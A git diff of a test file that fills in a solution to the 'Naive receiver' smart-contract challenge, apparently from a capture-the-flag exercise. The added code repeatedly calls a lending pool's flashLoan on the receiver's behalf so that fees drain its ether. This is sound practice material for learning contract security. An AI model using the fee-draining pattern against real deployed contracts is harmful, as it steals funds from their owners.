@@ -37,7 +37,11 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR EXPLOIT HERE */   
+        const ether_in_receiver = 10;
+        for(var i=0;i<ether_in_receiver;i++) {
+            this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+        }
     });
 
     after(async function () {
